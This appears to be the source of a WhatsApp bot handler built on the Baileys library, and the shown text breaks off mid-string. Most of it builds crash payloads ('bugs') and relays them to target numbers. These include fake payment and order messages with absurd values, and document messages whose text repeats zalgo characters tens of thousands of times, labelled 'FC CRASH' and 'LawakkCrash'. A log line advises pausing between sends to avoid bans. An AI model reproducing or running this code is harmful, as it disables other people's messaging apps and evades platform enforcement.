/*
════════════════════
🔥 Developer Credit 🔥
👑 Developer: RenXiter (开发者)
💎 Telegram: @RenXiter
☎️ Contact: +62 857 7760 1319

开发者：RenXiter
联系信息：+62 857 7760 1319
════════════════════
⚠️ WARNING ⚠️
❗ Gunakan layanan ini dengan bijak.
❗ Segala bentuk penyalahgunaan akan ditindak tegas.
❗ Hubungi kontak resmi untuk informasi lebih lanjut.
════════════════════
⚠️ WARNING ⚠️
❗ 使用此服务时请保持谨慎和尊重。
❗ 禁止任何形式的滥用，违者将依法追究责任。
❗ 如需更多信息，请通过官方渠道联系我们。
*/

require("./settings");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const fs2 = require("fs");
const chalk2 = require("chalk");
const crypto2 = require("crypto");
const axios = require("axios");
const momentTimezone = require("moment-timezone");
const nodeFetch = require("node-fetch");
const util2 = require("util");
const cheerio2 = require("cheerio");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  sizeFormatter
} = require("human-readable");
const vSizeFormatter = sizeFormatter();
const {
  smsg,
  isUrl,
  sleep,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat
} = require("./database/functions");
module.exports = RenSenku = async (p, p2, p3, p4, p5) => {
  const v = p2.mtype === "conversation" ? p2.message.conversation : p2.mtype == "imageMessage" ? p2.message.imageMessage.caption : p2.mtype == "videoMessage" ? p2.message.videoMessage.caption : p2.mtype == "extendedTextMessage" ? p2.message.extendedTextMessage.text : p2.mtype == "buttonsResponseMessage" ? p2.message.buttonsResponseMessage.selectedButtonId : p2.mtype == "listResponseMessage" ? p2.message.listResponseMessage.singleSelectReply.selectedRowId : p2.mtype == "templateButtonReplyMessage" ? p2.message.templateButtonReplyMessage.selectedId : p2.mtype === "messageContextInfo" ? p2.message.buttonsResponseMessage?.selectedButtonId || p2.message.listResponseMessage?.singleSelectReply.selectedRowId || p2.text : "";
  const v2 = typeof p2.text == "string" ? p2.text : "";
  const v3 = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(v) ? v.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : ".";
  const v4 = JSON.stringify(p2.message);
  const {
    type: _0xf7dfd8,
    quotedMsg: _0x272a09,
    mentioned: _0x397da4,
    now: _0x3569b5,
    fromMe: _0x11f692
  } = p2;
  const v5 = v.startsWith(v3);
  const v6 = p2.key.remoteJid;
  const v7 = v.replace(v3, "").trim().split(/ +/).shift().toLowerCase();
  const v8 = v.trim().split(/ +/).slice(1);
  const v9 = p2.pushName || "No Name";
  const v10 = await p.decodeJid(p.user.id);
  const v11 = [v10, ...owner].map(p6 => p6.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(p2.sender);
  const v12 = [v10, ...p5].map(p7 => p7.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(p2.sender);
  const v13 = q = v8.join(" ");
  const v14 = p2.quoted ? p2.quoted : p2;
  const v15 = (v14.msg || v14).mimetype || "";
  const v16 = /image|video|sticker|audio/.test(v15);
  const vF = p8 => {
    myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
    myDays = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum’at", "Sabtu"];
    var v17 = new Date(p8);
    var v18 = v17.getDate();
    bulan = v17.getMonth();
    var v20 = v17.getDay();
    var v20 = myDays[v20];
    var v21 = v17.getYear();
    var v22 = v21 < 1000 ? v21 + 1900 : v21;
    const v23 = momentTimezone.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    let v24 = new Date();
    let v25 = "id";
    let v26 = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let v27 = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((v24 * 1 + v26) / 84600000) % 5];
    return v20 + ", " + v18 + " - " + myMonths[bulan] + " - " + v22;
  };
  const v28 = momentTimezone.tz("asia/jakarta").format("HH:mm:ss");
  const v29 = p2.chat.endsWith("@g.us");
  const v30 = console.log;
  if (!p.public) {
    if (!p2.key.fromMe) {
      return;
    }
  }
  if (v7) {
    p.readMessages([p2.key]);
    const v31 = p2.isGroup ? "Dalam Grup" : "Privat Chat";
    v30("  ");
    v30(chalk2`{bold {yellowBright cmd} -> {cyan ${v7}} | Oleh -> {green ${v9}} | Di {yellow ${v31}} | Pesan -> {red ${v}}}`);
  }
  function f(p9, p10 = [], p11) {
    if (p11 == null || p11 == undefined || p11 == false) {
      const v32 = {
        text: p9,
        mentions: p10
      };
      const v33 = {
        quoted: p2
      };
      let v34 = p.sendMessage(v6, v32, v33);
      return v34;
    } else {
      const v35 = {
        text: p9,
        mentions: p10
      };
      const v36 = {
        quoted: p2
      };
      let v37 = p.sendMessage(v6, v35, v36);
      return v37;
    }
  }
  function f2(p12, p13) {
    const v38 = {
      quoted: p2
    };
    p.sendMessage(v6, {
      image: fs2.readFileSync(p12),
      caption: p13
    }, v38);
  }
  const vF2 = (p14, p15, p16, p17, p18) => {
    const v39 = "BEGIN:VCARD\nVERSION:3.0\nFN:" + p16 + "\n" + p15 + ":+" + p15 + "\n";
    const v40 = {
      vcard: v39
    };
    const v41 = {
      displayName: p16,
      contacts: [v40]
    };
    const v42 = {
      contacts: v41,
      mentions: p18 ? p18 : []
    };
    const v43 = {
      quoted: p17
    };
    return p.sendMessage(v6, v42, v43);
  };
  let v44 = await getBuffer("https://img100.pixhost.to/images/449/537921818_skyzopedia.jpg");
  const vF3 = p19 => {
    const v45 = {
      text: p19
    };
    p.sendMessage(p2.chat, v45, {
      quoted: p2
    });
  };
  async function f3(p20) {
    await p.relayMessage(p20, {
      paymentInviteMessage: {
        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 1814400000
      }
    }, {
      participant: {
        jid: p20
      }
    });
  }
  const v46 = {
    participant: "0@s.whatsapp.net",
    ...(p2.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  };
  const v47 = {
    key: v46,
    message: {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          jpegThumbnail: fs2.readFileSync("./database/Xvnc/Ren.png")
        },
        nativeFlowMessage: {
          buttons: [{
            name: "review_and_pay",
            buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ཱིRennVxཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
          }]
        }
      }
    }
  };
  const v48 = {
    key: {
      remoteJid: "p",
      fromMe: false,
      participant: "0@s.whatsapp.net"
    },
    message: {
      interactiveResponseMessage: {
        body: {
          text: "Sent",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(60000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
          version: 3
        }
      }
    }
  };
  const v49 = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast"
    },
    message: {
      orderMessage: {
        orderId: "999999999999",
        thumbnail: null,
        itemCount: 999999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: "p̸̢̻͓͎̻͂͒̋͒̓̃͊̐̔͘͝g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ͙o̶̯͎̱̱̱̱̱̱̱̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓Kont̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝",
        token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
      }
    },
    contextInfo: {
      mentionedJid: ["27746135260@s.whatsapp.net"],
      forwardingScore: 999,
      isForwarded: true
    }
  };
  const v50 = {
    participant: "0@s.whatsapp.net",
    ...(p2.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  };
  const v51 = {
    key: v50,
    message: {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          jpegThumbnail: fs2.readFileSync("./database/Xvnc/Ren.png")
        },
        nativeFlowMessage: {
          buttons: [{
            name: "review_and_pay",
            buttonParamsJson: "{\n              \"currency\": \"IDR\",\n              \"total_amount\": {\n                \"value\": 49981399788,\n                \"offset\": 100\n              },\n              \"reference_id\": \"4OON4PX3FFJ\",\n              \"type\": \"physical-goods\",\n              \"order\": {\n                \"status\": \"payment_requested\",\n                \"subtotal\": {\n                  \"value\": 49069994400,\n                  \"offset\": 100\n                },\n                \"tax\": {\n                  \"value\": 490699944,\n                  \"offset\": 100\n                },\n                \"discount\": {\n                  \"value\": 485792999999,\n                  \"offset\": 100\n                },\n                \"shipping\": {\n                  \"value\": 48999999900,\n                  \"offset\": 100\n                },\n                \"order_type\": \"ORDER\",\n                \"items\": [\n                  {\n                    \"retailer_id\": \"7842674605763435\",\n                    \"product_id\": \"7842674605763435\",\n                    \"name\": \"ཱིRennVx🕊️ཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིg̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ཱཱཱཱིིིི✨ BUG GANASS FC CRASH\",\n                    \"amount\": {\n                      \"value\": 9999900,\n                      \"offset\": 100\n                    },\n                    \"quantity\": 7\n                  },\n                  {\n                    \"retailer_id\": \"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\n                    \"name\": \"\",\n                    \"amount\": {\n                      \"value\": 999999900,\n                      \"offset\": 100\n                    },\n                    \"quantity\": 49\n                  }\n                ],\n                \"native_payment_methods\": []\n              }\n            }"
          }]
        }
      }
    }
  };
  async function f4(p21, p22, p23 = false, p24 = true) {
    let vGenerateWAMessageFromContent = generateWAMessageFromContent(p21, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 9007199254740991,
                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                fileName: "⿻ LawakkCrash ⿻",
                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1723855952",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "⭑̤▾ ⿻ RennVxUI ⿻ ▾⭑ꦾ" + "g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ".repeat(88888)
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
            }
          }
        }
      }
    }), {
      userJid: p21,
      quoted: p22
    });
    await p.relayMessage(p21, vGenerateWAMessageFromContent.message, p24 ? {
      participant: {
        jid: p21
      }
    } : {});
    console.log(chalk2.blue(" 𖣂̤𓍯  *DO NE SEND BUG JEDA 3-7 MENIT AGAR TIDAK TERKENA BAND* 𓍯𖣂"));
  }
  async function f5(p25, p26 = true) {
    await p.relayMessage(p25, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆